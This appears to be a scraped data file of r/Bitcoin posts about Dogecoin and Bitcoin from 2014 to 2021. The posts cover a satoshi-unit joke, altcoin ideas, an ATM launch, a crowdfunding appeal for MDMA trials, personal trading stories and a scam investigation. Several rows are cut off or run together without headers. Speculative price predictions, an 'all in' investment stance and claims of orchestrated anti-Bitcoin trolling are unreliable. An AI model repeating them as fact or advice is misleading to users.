1. Proof of burn: turn your btc into newcoin[1]. Ensures a fair distribution and no premining by me. 
2. LOW PRICE POINT: This is HUGE! The coins value at launch is only 0.000008 USD per newcoin[1]!!! Now you can tip people 100 to 100,000 newcoin[1] and not even flinch. 
3. Announcing new protocol, tentatively called ""Manual Mining"". Explained below.

So how do you get newcoin[1]? The process is relatively simple. First, write down on a piece of paper how many bitcoins you have and write it out with all the decimal places. For example, if you have half a bitcoin, write:

0.50000000

If you have, 39.73 bitcoins, write:

39.73000000

Now, here's where Manual Mining and Proof of Burn come in. What you have to do to create your newcoins[1] is find the little dot (or period, or comma for some of you), and then delete it. You should also remove leading zeros and add a comma (or period, if you use a decimal comma), every three digits. Sounds complicated, so let's practice. The examples above would become:

50,000,000 and 3,973,000,000

Boom! Done! You now have burned your BTC and gotten fresh new affordable newcoins*! Best of all, newcoin[1], works on top of the Bitcoin network, so transactions are super secure. 

What do you guys think? Now everybody can afford crypto currencies! It's only 8 bucks for 1 million newcoins[1]!

[1] I'm trying to come up with a better name for newcoin. What do you guys think of calling it a ""Satoshi""? I think that would be a good name.

Bitcoin is a means to communicate many things in one protocol (as Naval Ravitkant has said quite well -  https://www.youtube.com/watch?v=Zmi_3Q0w9kE). One of those things bitcoin users communicates to people is the idea that we are all going to operate with a fair monetary system. One where our time (money) can not be counterfeited. By accepting various coins a company doesn't value the idea that the total money supply should be fixed (see note). So now I don't prefer to communicate my time with them. Not for any bad reasons, but it just feels like they don't speak the same language. What are other's thoughts?

Note: by using litecoin they increase the number of ""units"" that are used to communicate time, therefore increasing the money supply.",1,2014-09-04 01:01:18,16

DOGE,Bitcoin,Pegging an Altcoin to the USD to end the Exchange Woes that Currently Plauge Digital Currencies (copy of post originally on /r/dogecoin subreddit),"Copy of a post originally in /dogecoin subreddit:

If a new altcoin was launched where the mining dificulty was determined by its value vs. the USD a lot of the issues caused by exchanges and conversion of coins could be prevented. Basically this altcoin (lets call it greenbackcoin) had an optimal exchange rate of 1 greenbackcoin = 1 USD. Then if it was trading at over 1 USD the mining dificulty would be reduced to increase the # of coins in circulation and lower each coins value. If the value was below 1 USD the difficulty would increase, depleting the new coins available and driving up the price. This way anyone who wanted to ""cash out"" of whatever coin they were in could exchange their coins for greenbacks with relative ease (compared to actually obtaining usd via an exchange). This would increase the liquidity of every crypto-coin market and make it that much harder for any government to regulate digital currency. If the coin took off, I think it would quickly maintain a value very close to 1 USD. The equivalent of daytrading algorithms would allow investors to capitalize on slight deviations (buy low, sell high) both in the greenback to USD market and the altcoin to greenback market, keeping rates near perfect.

This would prevent something like the collapse of Mt Gox from decimating the value of a coin, since the greenback would be a decentralized, self perpetuating currency.

The one concern would be ensuring that mining was all in all a profitable endevour, since the currency being pegged to the USD could impact the profitability of mining. Im not sure how to do this but I do have one potential idea. Since the greenback would offer a benefit to every other coin perhaps there could be the requirement that anyone who held above a certian # of greenbacks operate a mining rig. Thus requiring those who wish to hold large amounts of the currency either mine, or have an account with a mining operation that held their greenbacks for them, incentivizing the mining operation. Such miners would then become defacto exchanges.

- There were no bitcoin ATMs

- There were no decentralized asset exchanges for stocks (counterparty, colored coins)

- There was no decentralized market for goods and services (OpenBazaar)

- There was no Dark Wallet for bitcoin privacy

- Three of the largest crypto stock exchanges had just shut down nearly simultaneously, sending crypto-equities into disarray (BTC-GLOBAL, Litecoin Global, Bitfunder). Havelock Investments ""relocated"" to Panama

- Apple had zero policy on virtual currencies and would ban bitcoin apps

- Paypal would ban virtual currency transactions and hadn't made any favorable stance toward them whatsoever

- Mt. Gox withdrawals were delayed months on end, even as people continued to send fiat and bitcoin to accounts there

- Prospective miners were still ordering from Butterfly Labs

- There was no tax guidance for bitcoin or virtual currencies, in the United States, as a large rally in bitcoin price history was beginning

- Dogecoin did not exist, and by proxy, philanthropic crowdfunding of sports events or .. anything really.. had never happened in cryptocurrency. There literally was no onramp for beginners and there was nothing to really laugh at either

DOGE,Bitcoin,[ANN] Tijuana's 1st Bitcoin & the worlds 1st Litecoin & Dogecoin ATM's opening!,"Bitcoin42 ATM’s are opening in the week of the 17th of March at the BIT Center in Tijuana!  Shocked

We will present two ATM’s that buy and sell Bitcoins, one accepts US Dollars, the other Mexican Pesos. They are the first ones not only in Mexico but also in Latin America! With them, customers will also be able to buy a limited amount of Litecoins and Dogecoins. WOW!

Our main objective is a positive contribution to the potential of all living beings to develop, today and in the future. Our business model focuses on cultural, social, ecological, and economical projects that aim to tackle challenges in our society by developing creative solutions. Ethical and social responsibility is important to us. We are inspired by the Institute for Social Banking* and the Economy for the Common Good*, which received larger popularity since the banking crisis. To start, we will be giving 10% of all generated profits to local non-profit associations in Tijuana. Furthermore, customers will be able to choose the cause they want to donate to. Our motto: Think Global, Act Local!

We especially advocate for the use of crypto-currencies by non-profit organizations, so they can lower their administration costs. Through the use of crypto-currencies, non-profit organizations can get funds in a faster and more efficient way with the highest level of transparency. Through this, anybody can become a (truly) independent auditor, since one can provide information to verify balances and transactions and also allow the public to see how much in donations has been received and where it went.

We are also preparing the first Social and Ethical Crypto Currency Network, in order to enhance social and ethical responsibility in the world. We know this is a challenge, but we are ready to take it. We are open to suggestions, help and any form of support. If you are interested, contact us at synergy@bitcoin42.com or visit us at our office, M5-3 at the Bit Center in Tijuana.

More information will follow soon. For example the exact date when we open operations.   Smiley

DOGE,Bitcoin,TIL Dogecoin has an active subreddit dedicated to PR - something Bitcoin can learn from?,"Just found out that /r/dogecoin has an active subreddit dedicated to PR efforts: /r/Dogecoin_PR.

I am aware that Bitcoin already has lots and lots of companies that are involved heavily in promoting Bitcoin, but a grassroots effort to promote Bitcoin in every possible manner is so much more important. Be it entering in competitions, giving to charity or the like, Dogecoin has established themselves as the masters of this. Not that we need take such a position from them, but we have to show that we are charitable as well.

Good news!  He's interested in speaking further.

Nothing is confirmed or agreed on.   Just wanted to see how serious people are and get an idea about what we might be able to raise or offer him.

Sports are a great way to spread the word about something and have been used successfully in many types of marketing.  UFC is a great fit because it's a fast growing sport with athletes who are more accessible than the NFL or NBA for example.

Please don't send any money anywhere yet -  if and when we agree on something with Joe, we will do a video with the keys etc. like Andreas did for the Dorian donation.   Please do NOT trust anything unless it is from Joe directly or from me and also verified by Joe.

DOGE,Bitcoin,"🍍 $4mil will fund MDMA trials for PTSD; marked 'Breakthrough Therapy' by FDA. Pineapple Fund is matching MAPS donations 1:1. Reddit, let's make history by crowdfunding an incredible treatment for PTSD, in bitcoin!","Hi /r/Bitcoin!

You might've heard of PTSD. It's a debilitating illness usually affecting people who are _already_ victims, like sexual assault survivors who still suffer and are tormented every day since. Not only do they experience traumatic flashbacks, even sleep is no relief thanks to serious nightmares. It is life threatening. 

Existing treatment for PTSD aren't great. Therapy can be helpful, but they're often not enough, especially for severe PTSD. There are only two drugs approved by the FDA: SSRIs like Zoloft and Paxil. Those drugs must be taken continuously, and can cause serious side effects. Mania, seizures, inability to orgasm, and suicide are known side effects.

In 1986, a nonprofit named MAPS was started to develop legal contexts for beneficial uses of psychedelics and marijuana. 31 years later, MAPS has found its most promising candidate yet: MDMA-assisted psychotherapy as a treatment for PTSD. 

# The numbers: 68% (MDMA) versus 25% (placebo)

They've already conducted Phase 2 studies in the US, Canada, Israel, and Switzerland. After a comprehensive therapeutic process involving preparatory sessions, MDMA-assisted therapy sessions, and non-drug therapy sessions, **61% no longer met the criteria for PTSD**. This improved to **68%** after a year. Of those who met the criteria, many experienced significant reductions in symptoms. This is compared to only 25% for the placebo group, who received all the therapy, but with a sugar pill instead of MDMA.

For most people, the benefits are lasting. MAPS conducted one long-term outcome study, evaluating patients ~3.5 years after the last MDMA-assisted sessions. Average benefits even increased slightly over time.

> ""The MDMA sessions were the first time I'd ever felt love for myself. It was the first time I'd ever felt happy. I hugged my therapist and said 'Thank you.'""

After MAPS' studies, the FDA granted ['Breakthrough Therapy Designation'](https://www.maps.org/news/media/6786-press-release-fda-grants-breakthrough-therapy-designation-for-mdma-assisted-psychotherapy-for-ptsd,-agrees-on-special-protocol-assessment-for-phase-3-trials) to MDMA-assisted psychotherapy.

Now they need to conduct Phase 3 trials, which are far costlier due to requirements for an increased sample size, groups, etc, even through the stage with highest failure rates (Phase 2) is already over. MAPS has achieved the extra-ordinary journey of bringing MDMA-assisted psychotherapy all the way to Phase 3; a drug that pharmas will never touch because it will disrupt their recurring revenue streams of SSRIs.

# Phase 3

Phase 3 will cost about $25 million. They've raised $17 million already ($1 mil from PF included), and need another $8 million to get to the finish line. 

I have never donated to MAPS (or even heard of them) before starting the Pineapple Fund. PF donated $1 million, and that inspired another anonymous donator to **give another $1 million** in bitcoin. To whoever you are, you're amazing, and you are inspiring. <3

**I believe we, the cryptocurrency community, can fully fund Phase 3 trials**. Prescription MDMA could be a gift to this world from the bitcoin community.

If the trial succeeds, it could be approved as early as 2021. MAPS has created a public benefit corporation, fully owned by the non-profit, that would sell MDMA post-approval. This is a scalable and **financially sustainable** structure that could kickstart a renaissance in research into the therapeutic applications of many different psychedelics.

**Pineapple Fund will double the value of every donation to MAPS** from today until March 10th, up to $4 million. 

You can donate with bitcoin. It's like donating bitcoin for $30,000 each!

http://www.maps.org/donate-redirect/cryptocurrency

You can also donate with legacy payment systems like [credit cards or PayPal](https://store.maps.org/np/clients/maps/donation.jsp?campaign=103), and PF will also match that donation.

Your donations are tax deductible (if you're a US taxpayer), and you don't even have to pay capital gains tax. Ask for a receipt if so.

Let's make MDMA medicine a reality, and give the gift of an enjoyable life to those suffering from PTSD. If you believe that psychedelic drugs can have incredible therapeutic potential, then I believe this is one of the highest impact projects today.

And let's do it with cryptocurrency :)",10656,2018-01-10 14:53:06,525

DOGE,Bitcoin,In 2017 I sold 100 BTC (and BCH) for 1.5M dollars USD – Some thoughts,"Since we are in a bull run (the big one?) I thought I might share some reflections. I’m seeing a lot of newcomers (welcome!) as well as some sophomore types with questions, ideas, admonitions, and the like. Pull up a chair, I've been around these parts for a while. And if anyone starts in with the ""but yr account is only 2 years old"" bullshit... come on, use your head.

First off, as Ecclesiastes 1:9 states:
>What has been will be again,

>  what has been done will be done again;

> there is nothing new under the sun.


Over the last 7 years I have seen all these questions about what to do, these statements of selling, and others commenting how stupid and ignorant anyone who sells “right now” must be. People have called me a fucking moron for daring to part with some of my bitcoin, or argued with me that I don’t understand what I did. They are sad people (jealous? myopic? entitled? I still don’t know what they are trying to prove.) 


Secondly: I’m certain a number of you will not believe my story. That is your right. I will not provide tx-id’s or any other form of proof. I just ask that you look at my post history and ponder – either this guy made up a story several years ago and stuck to it, posting every so often between /r/bitcoin and /r/financialindependence for magic internet points or maybe he is telling the truth. Seriously; if you doubt my story look at the post history and see if that helps, if not… so be it.

**The story** 

I got into bitcoin back in 2013 or so, reading about it and really going down the rabbit hole. I am a scientist, and it is my nature to go deep on things of interest. One thing I learned in my graduate studies was “how to learn” (how to research). For you whippersnappers – that means more than Google and YouTube. So I learned, I read, I watched interviews, I set up a node, I mined shitcoins to understand how that worked (and traded them for bitcoin in the end.) Nobody I knew was into bitcoin, and nobody would listen to me about it. I tried to get my brother interested. I tried to get a tech friend interested. Both of them agreed it was “interesting” but not enough to acquire any bitcoin (this was around the time of bitcoin being just under $1k, before it dropped for several years post MtGox meltdown). So I carried on alone, with just the interwebs to console me.

In 2017 when bitcoin hit $4,000 or so, I sold 40 - enough to pay off my mortgage and cover my original costs to acquire all my holdings (avg sale price $4320). If bitcoin ate shit and died, I had a good ride, and had a paid off house to boot. I think it was a week or two later that it was $8,000. Then soon after it almost hit $20k and started dropping. I didn’t panic, but I woke up in mid-December and my brain screamed “don’t be greedy” to me. I listened to my brain and sold 60 BTC at around $15.6k each. Additionally, as I had my coins on Coinbase, when they opened trading for BCH in late December I dumped them within the first hour for around $3550 each. When all was said and done I had made somewhere near 1.5M USD. 


If you have questions about how much I paid in taxes, how I moved the money, if my bank gave a shit (spoiler: they did not) etc. it’s covered in [this post]( https://www.reddit.com/r/Bitcoin/comments/fxho4v/stop_the_bullshit_if_you_sell_your_btc_on/) with details asked in the comments. You also get to see people tell me I am wrong, so there’s that fun as well. 


I kept the rest of my BTC, and watched the price shrink down over the next couple years. I wondered if I had made a mistake by not cashing out, missed my “big chance for maxxx profits” or whatever, but it didn’t really matter that much because a few months after I made the initial money and paid my taxes, **I fucking retired**. Yes, as of almost 3 years ago, I retired. It wasn’t only because of the bitcoin – I had saved money, had a 401k, and an IRA. I was on my way to a modest retirement somewhere in my 50’s or so if I wanted it, but then BOOM, I had a huge nest egg, a paid off house, other savings, and additional bitcoin for the future. Cool. kthxbye work world!


I have spent the last 3 years leisurely pursuing my own things like art and music, woodworking, collage, gardening along with sleeping in and lots of meditation and porch dwelling. There have been several small tragedies in my life since then (parents in poor health, for one) and so I have been able to tend to that more so than I could if I was working. Being retired has given me so many options and so much control over my life. I love it.


Some of you might be thinking something along the lines of - Now here we are…bitcoin is worth $40k so roughly speaking this guy (me) “lost out” so far on about 2.4M after taxes. There’s also the fact that if I had kept working these last 3 years I would have additional income/savings that I could have invested so let’s round up to 3M after taxes, assuming I sold the 100 BTC now and the BCH immediately (I’m not a fan, and actually am surprised it didn’t die). How do I feel about losing out on $3M (and counting)? Honestly, not particularly bad.

Here’s the deal – when you get to a certain point in your net worth, where you can cover your costs for your lifestyle and more (and this number is different for everyone, for me I’m really chill, so no lambo interests) the money sort of converts itself into a score like on a video game. I can look back and think “oh man, 3 million fucking dollars more! Oh shit!” but do I lose sleep over it? No. Do I kick myself? Not really. My score is lower than it could have been… but in return, I got to help a friend die peacefully, I helped another friend pivot his business, I moved to a new city and bought a cool house (still own the old one as a rental, but maybe not for much longer), and I get to wake up every day and do exactly what I want to do (minus covid issues). It’s really nice to be out of the rat race. It suits me well. I know now that I could have made more - but at the time I had no clue, and there is something to be said for the comfort of the sure thing. 


My base take is this – we only have so much time on this planet, and I’d like to maximize my control (vs. my wealth) as much as possible. It would be hard to imagine reliving the last 3 years with a full time job, and I don’t care to dwell on what might have been. I hit my retirement number (1.5x my number + remaining BTC) and GTFO of the system. That money has grown in the funds I put it into, and I never touch principle. My remaining bitcoin became and remain gravy and I plan on hodling until it doesn’t make sense anymore. My advice to all of you is to do your research, know your game plan for selling (I didn’t really have a solid one, honestly), be excellent to each other, and live that life. Ignore the noise – from nosy people in internet forums, from grouchy jealous jerkoffs, etc. This is your deal. 

I’m happy to answer any questions. Hope you found this interesting.",3240,2021-01-10 07:24:20,566

DOGE,Bitcoin,In mid 2012 I bought 600 Bitcoin.,"In late 2012 I bought 600 BTC. I bought it because I thought in a sense I was donating to a cause, not for an investment. It went to $950. At one point my $4000 was worth half a million, which was almost 10× my portfolio. I sold 5 Bitcoin and spent a bit for some weed on the silk road (I was 20, please forgive me. Besides, back then, other than an eBay type website that you could buy gift cards from, you couldnt get much with bitcoin. Anybody remember the famous pizza?) Than bitcoin tumbled to $300. I invested in Doge with some of it, lost a lot there. I had over 5mil doge coin lost in a reddit tip wallet. I took my family on vacation through expedia after i had each of my kids, now 3. And once with my mom, so she could take the grand kids to disney world (she always wanted to take me and my sisters but single parent life sucks) After all the investments I should not have made, and the fun I do not regret having, I am a proud owner of 1.5 BTC.
The reason I made this post is so people can see the ups and downs of Bitcoin. Please understand, everything is about price now, but at one point it wasn't. It was the dread pirate Roberts sticking it to the man, it was people using bitcoin as a way to protest our government bailing out banks and letting us middle class and lower suffer. Trust me when I say a 50% change in bitcoin is not strange. I personally hope it shakes the greedy people off and liberates us like it was designed to do. A world wide currency, untouchable by our greedy governments. If I want to send money to a young man in Taiwan because I believe in his invention, I should be able to. Just as I once sent money to a magic card trading website in exchange for magic internet money because I believed in the cause.

Edit: fat fingers, cell phone post.

DOGE,Bitcoin,I’m all in,"As the title suggests - I’m all in on Bitcoin.

Background: 28 year old with no financial obligations (no house, wife, kids etc). I have a stable job working for a Hedge Fund in London.

The way I see Bitcoin is essentially an asymmetric risk/reward bet. There’s a possibility it doesn’t take off from the $10k mark and the price falls indefinitely.

On the flip side there is a multitude of bullish sentiment which could realistically 10x the price over the next 5 years.

My argument is - with house and equity prices at all time highs, what is my best bet to maximise my income for the future? A provably scarce hard asset that has an enormous network effect and the possibility to grow into a multi trillion market seems like a sensible option.

My strategy is definitely not for everyone. I am diversified in the sense that my salary is correlated with the stock market. If BTC and the equity market collapse simultaneously then I will cry myself to sleep for a few days but I’ll still be debt free.

DOGECOIN...

Now I know not everyone in this sub takes DOGE to be anything more than a joke, but it is undeniable that it has made a huge impact on the crypto market in the last couple weeks...The trade volume has been over 1/3 that of bitcoin, the price has gone up 8x, and it has been getting a ton of media attention.

Realizing that the marketcap in comparison to BTC is minuscule when it comes to DOGE, the liquidity of the DOGE market is insanely high...What are the community's thoughts about it's actual impact?

**TL;DR**

Serious discussion...DOGE has 33% the trade volume of BTC yet less than 1% of BTC's market cap...Could this have any effect on BTC price?

**EDIT 1:** What I am getting at (which I forgot in the original post) is that a large part of this volume is likely people converting from DOGE then cashing out to fiat, with most DOGE purchases coming from people who have already been holding BTC and converting to DOGE to play the market...

#**FULL POST**
##ATM announcement

[The first post about moolah ATMs](http://redd.it/1v8ibg/) appears in dogecoin subreddit in **January 2014**. The dogecoin community which is still very young today back then is in its infancy. A person posting under user name  moolah_ offers preorders for ATMs that would allow simple purchasing of  **dogecoins**, **bitcoins** and **litecoins**. 

##Excitement
As it is the **first ever ATM** that promises simple purchasing of DOGE the dogecoin community is very excited. The fact that the ATMs are offered at a **very attractive price** of **550 USD** per unit fuels the excitement even more.

According to [moolah own post](https://moolah.io/atm) from the time of announcement the response is so overwhelming that they decide to up the number of units from 30 to **50** 
> *Since we first announced our multi-currency cryptocoin ATM machine* **yesterday** *, we have received an overwhelming level of support in response... Initially, we were building 30 prototypes to start, with a shipping deadline of March 28th. We are sticking to this shipping deadline, but are following on from the level of demand we have received, will be upping the prototype count to 50.*

* **Total investment:** 550USD x 50 units = **27,500 USD**.

##Concerns
The /u/moolah_ account was created on January the 2^nd 2014, the post appears on January 14^th. 

At the time of posting:

 - moolah_ **account** is **less than 2 weeks old**,
 - moolah_ is a **completely anonymous** user,
 - moolah_ has **no history** of **selling** and **delivering** any previous products.

Obviously those facts raise some **red flags** for more cautious users. [The concerns are expressed questioning the offering](http://redd.it/1vi6rn). The users who previously witnessed many scams in cryptocurrency world warn the more trusting ones to be careful and demand some information that could verify if the offering is legit.
##Promisses
In **response** to some of the **concerns** and **questions** /u/moolah_ makes a number of promises. 

**He promises**:

 * to post a **video** of **working unit** within **2 weeks** from the date of the post (**January**)
 * to **open source the code** well **in advance** of the release date in order to **assure** buyers that the **code is not malicious**
 * to **ship** all 50 of the prototype units by the **deadline** of **28 March 2014**

[Quotes of moolah_ comments from Jan 18^th 2014](http://redd.it/1vi6rn)
> * *The first units start shipping in a few weeks* 
* *A member of the team (probably me) will appear in the next promo video* 
* *We'll send a working ATM to the people who have ordered them, and demonstrate it working well in advance of that.*
*  *I will have a prototype sent to one of the founders funded by myself personally*
* *Our way of building trust was simply going to be to continue running a reliable platform, and ship our physical products when we say we will.*
* *In order to further build trust, we will be open sourcing the software portion of the devices ahead of schedule (within a week) for people to analyze.*

##Raising more BTC
Moolah starts becoming more and more popular on dogecoin subreddit, with his main offering being online multi-cryptocurrency wallet.  

In late January he opens an investment round for his business: round 1 PIE where he offers **15% stake in profits** of his business in exchange for **250 BTC**. In this round he is accepting investments as small as **0.1 BTC** and **50k DOGE**.

During the week leading to first dogecoin halving moolah_ promotes “*Moolah week of awesomeness*”.  During this campaign each day he announces development and delivery of multiple dogeoin focused products. The community is excited and the investors money pouring in. One of the announcements mentioned during week of awesomeness is again crypto **ATM**.

##ATM deadline approaching
The 28 of March deadline of delivery of ATM is approaching. There is no sign of the ATMs:

 * no videos,
 * no specification,
 * no demos,
 * no source code published.

ATMs are mentioned  moolah posts wherehe is listing products he developed or is working on. On some occasions he mentions **ATM units being boxed and ready to ship**

####Quotes from moolah.io blog

* The first prototype unit works amazingly, and we’ll be putting up videos as soon as we finalize an enclosure for it [(Jan 26 2014)](http://blog.moolah.io/2014/01/26/state-of-affairs/)
* Our enclosure is en route, you’ll be seeing a video in the very near future and we’ll be shipping the first couple of units! [(Feb 5 2014)](/http://blog.moolah.io/2014/02/05/so-whats-coming-this-week/)
* ATM Units, They’re ready to go. Big blog post coming shortly. [(Mar 6 2014)](http://blog.moolah.io/2014/03/06/so-where-are-we-at/)
* On the physical product side of things, the first of our ATM units are ready to ship. **There’s a couple boxed up** and they’ll be going out to a few lucky people. We’ll be continuing to ship these on a regular basis. 
[(Mar 17 2014)](http://blog.moolah.io/2014/03/17/prelude-and-the-future-of-moolah-please-read-somewhat-important-to-me/)

##Challenge: Ponzi-scheme question

On 26 of March, 2 days prior to the shipping deadline a [post appears on dogecoin subreddit calling on moolah to fulfill his promises](http://redd.it/21e8mj):
>**I have only one kind requests to /user/moolah_**  
>
* Please post the video of the working prototype of Moolah ATM ideally with your face in it. It does not need to be professional, phone video will be just fine. A simple demonstration of how the unit works.   

OP is hopeful that the promised videos would be demonstrated but also expresses **serious  concerns** that the business run by the person behind moolah_ could be **malicious** in nature and may have many features of a **ponzi-scheme**.

>
**My worst fear:**  

>
We will be told the the ATM failed testing / got damaged in shipping / were stolen by competition you know the drill, and will never be released. Now the interesting part of that worst case scenario: the original **investors will be refunded** their investment **perhaps with generous interest** (guess the source of the fund towards it) and the ponzi scheme life goes on...

In response to this post moolah_ **once again** makes the **promise** to post a **video of working ATMs**  
moolah_ states the following:
> * *I will happily post a video of a working unit in the next day or two.*

##ATM problems and refunds

Over 2 months have passed since the ATM shipping deadline - still **no signs** of **video**, photos, demos, source code, even the exact specs remain unknown. That is **11 months** since according to moolah they started working on this product. 

On June 8, one of the original investors finally [requests an update on delivery of the ATM](http://redd.it/27l19g) supporting the request by a copy of his correspondence with moolah_.

On June 9, moolah in [his bog post](http://blog.moolah.io/2014/06/09/update-on-atm-units-and-an-apology/) offers an apology and one of 2 options

* A full refund, plus an extra $100 as compensation.
* The device, plus a $100 refund.

The investor is satisfied with the offer and updates his original post.

##ATM Status as per today 10^th of June 2014

 * **no videos**,
 * **no exact specification**,
 * **no demos**,
 * **no source code published**.

## CRITICAL QUESTIONS:
* Is the product offered by moolah_; crypto currency ATM **legit** or is it a **scam** **?**
* Also as the other major services offered by the businesses run by moolah_ are **build** around the concept of **trust**; **can** the businesses run by moolah_ be truly **TRUSTED?**

____
##IMPORTANT
For those who say “*You did not order ATM so it is none of your business and you have no right to ask questions*”
  
* **We DO HAVE all the rights to asks questions**. The main services provided by moolah_ - the online wallet and exchange are heavily relying on the concept of  **TRUST**.  The **TRUST** users put in the people running the services. Those people, namely moolah_ hold the **KEY** which **could** potentially be used to **empty** the wallet and the exchange **at any time**.

* All we are doing is trying to **VERIFY HOW TRUSTWORTHY** and **HOW ACCOUNTABLE** the person behind moolah_ is.   

* This is done by looking at **their** product **history**.  The development of ATM units **IS the history** of moolah_, which they should be accounted for.  
 * They took money from people in exchange for the promise of developing a product. 
 * That product happens to be **in their own words**: “***The Moolah ATM was the first product that we envisioned, and was the reason for us founding Moolah.***”.
 * They also claim they had **worked** on this product **6 months prior** to offering the pre-orders in **January**.  
* despite the fact that they have never demonstrated their first promised product, they kept taking money from investors under their PIE 1,2,3 schemes (officially **750 BTC** which is currently worth close to **half a million USD**) 
* took investments for ASICs farms; moofarm 1 and moofarm 2
* the business run by moolah_ accepts wide range of cryptos  BTC, LTC, DOGE, VRT and many more. If it turns out not to be legit  **any person** holding these currencies **will be affected**.

DOGE,Bitcoin,"Bitcoin could be worth 1000x today's value within two years, or it could be worth nothing given the community's trajectory lately. Here are my two millibits on our possible future(s).","It's not the community's fault, by the way.

Bitcoin is getting attacked in complex, sophisticated ways we will only understand fully much later. Glenn Greenwald's [latest scoop](https://firstlook.org/theintercept/2014/02/24/jtrig-manipulation/), which went largely 'unnoticed' by the corporate media, was that GCHQ/NSA use trolls to harass, intimidate, derail online communities, and destroy the lives of 'hacktivists' (i.e. tech savvy activists) the surveillance agency dislikes. 

Based on my preliminary research, the Bitcoin community is falling victim to nearly identical tactics.

There is no need for us to point fingers at each other or give in to paranoia - in fact, that's one of the intended outcomes of online *provocateurs* in the first place. 

We are all aware, however, that some individuals have tried their best to make Bitcoin look very bad in the eyes of the public, and some members of the media have tried their damnedest to keep their viewers from ever wanting to explore the ""seedy,"" ""dangerous,"" ""unregulated,"" world of the scary ""bitcorn"".

My background dictates that I look very closely not only at forensics, but at motives. I see tremendous motive from vested interests around the world - governments, banks, some payment processors, investing opportunists - to attack Bitcoin now, with everything they've got.

Again, no need to finger point, because **Bitcoin is a battle you folks win.**

In fact, you've already won, on paper at least. Bitcoin is a much better *technology* than the credit card in your wallet or your checking account. That is fact. Your credit card is basically a private key exposed, half-assed department store financial product designed 60 years ago (actually, that's exactly what a credit card is). And your Too Big To Fail checking account is a Mt. Gox account with a better PR department. 

They can spread a lot of fear - and they are doing so - but a time will come when consumers take a sober look at cryptocurrency face to face with its ""competition"". And the choice is clear. This is a Pepsi Challenge you all win any day of the week, without fail.

**Crypto is better, the only way it can be destroyed is to prevent it from gaining critical mass.**

You have to understand - that's the motive here. 

How do you beat a technology that's clearly better, faster, cheaper than yours, in every single way? **You destroy its reputation. You peddle fear. You make something that was initially tempting scary and unwelcome.**

If Bitcoin loses in the court of public opinion, which it is rapidly doing, Bitcoin loses. Forever.

You can be the best accountant in the world. If your neighbors spread the rumor that you might be killing kittens in your backyard, no one will want to hire you. **A reputational loss, therefore, CAN destroy an otherwise superior product or service.**

Cryptocurrency can survive another Mark Karpeles, or ten more if need be, but it can't survive a public that no longer has any use for it. 

The solution is first of all, to be more savvy as a community. Don't upvote every blogger's traffic hungry bullshit. Don't peddle unfounded fear yourself. Verify your information. Don't use exchange services with no track record, when there are now services operating with a decent track record, full compliance, and credible financial backers. 

**And second of all, the solution is to use Bitcoin constantly.** 

CONSTANTLY!

That's how you will see a 100x or 1000x gain over time, if making money is your thing. 

As transaction volume scales, demand must in turn scale. And the various scarcity elements of Bitcoin will kick into overdrive once this becomes a household means of paying friends, buying products online, tipping musicians you like on Soundcloud, etc. 

Some finance and lawyer types have snuck into the Bitcoin world, and they sound like they are completely full of shit. They don't ""get"" Bitcoin or the tremendous changes that decentralized personal finance will bring. They just see Bitcoin as a new ETF type thing for them to make a quick 30% from and maybe some fat consulting fees or book deal. Nothing *too* wrong with that, I guess, but certainly not who you want to prop up as spokespeople for the community. They want to talk regulation all day and beg for establishment adoption. That's, again, how you get a 30% gain. Not how you get a 1,000% or 10,000% gain.

The only spokesperson type I trust here is Andreas Antonopoulos, everything he says is pretty much a more intelligent version of what I would want to say in a similar situation. And I think even Andreas would agree the instant he starts talking shit or harming Bitcoin, you should abandon him, or anyone else who becomes a liability to the community's long-term aims. 

Huge gains will only come from true widespread adoption, not from convincing a bunch of thoroughly boring assholes to dip their hedge fund toes into the crypto pond. 

The Bitcoin community is accused of ""fanaticism"" by the mainstream press from time to time. 

If your product is better, if your worldview is more sane and more efficient for all stakeholders, **it's OK to be fanatical.**

In fact, you'd better be, or those with an inferior product and superior marketing muscle will talk you right out of business.



That's exactly what is happening now, with all the bullshit people in this subreddit who don't own any coin, but constantly complain, constantly accuse the rest of us of ""circle jerking"".

Some of these people are idiots. Some of them are angry they missed the boat on Bitcoin's first couple big jumps. And I believe some of them are more coordinated, professional forms of manipulation. In the case of the professional manipulation, the aim isn't to troll you or me. It's to create a ""negative image"" around the community itself - that we're complainers, not a fun place to browse, not a fun product to use. Check their comment histories: either brand new accounts, or accounts that exclusively spread anti-Bitcoin content. You have to ask yourself what's going on.

The solution here is probably to have more active mods. Don't be ashamed to delete and ban manipulators. Freedom of speech is sacrosanct, but it doesn't extend to a forum where users of a cryptocurrency are trying to help each other improve that currency and enhance its reach. Block them without regret - there's a difference between honest questioning or criticism of Bitcoin's ""power structure"" and overt, repeated manipulation.

Anyway, I have to leave it here as I am already late for work. Hope someone enjoyed reading this.

**update** In case it wasn't clear from the words I used, I am *not* suggesting that the government of the United States of America or the U.K. is sitting here on this subreddit, trying to take down Bitcoin. There are 193 countries on this green Earth, and quite a few of them are threatened by what crypto represents (think Russia, as merely one quick example - I don't think Russia's oligarchs are particularly opposed to crypto, but the government there is terrified of anything that could provoke a rush out of the ruble). There are also more than a few powerful money wiring services and multinational banks who feel Bitcoin is not in their interests. It takes only one of these constituent members to hire a private intel firm to completely derail most online Bitcoin discussion. Based on the latest Greenwald reporting, if the GCHQ (supposedly the best run, most professional, etc etc surveillance agency) is *with certainty* engaged in advanced online social engineering, it is very likely that similar services can be bought from contractors who have less scruples and less regulatory oversight than NSA and GCHQ operators. But these aren't theories coming from out of nowhere. Check out negative comments posted here, follow the comment histories, this stuff simply does not add up. It's not organic communication or discontent, it's orchestrated.

Is it really unnatural to downvote doge in the bitcoin reddit? I dont think so, since this is the **bitcoin reddit**.

I have manually imported all 203 private keys to a new wallet. No change.

If wallet.dat file is loaded into a text editor there is a about 20 lines of pooldata at the end of the file.

But if I could make some fast money I'd get my guys, kidnap you and cut off your fingers until you tell me your seed"".
We had some beers and continued with some different shit. But right now I am searching for some self defense tools. I've never felt so uncomfortable. Hope things will not get ugly.
Here is my advice: No matter how much you love the technology or how badly you want to share your Bitcoin story: Don't tell someone unless you are not 100% sure that he is trustworthy. Don't be foolish like me.",379,2021-03-31 19:57:38,317

DOGE,Bitcoin,I sued BFL in Kansas jurisdiction and won.,"I sued BFL and won. Since I live in California, I had to hire an attorney in Johnson County KS. I won by default with damages and atty fees awarded, as BFL failed to show at trial. 

My case is a matter of public record, case 13LA09619

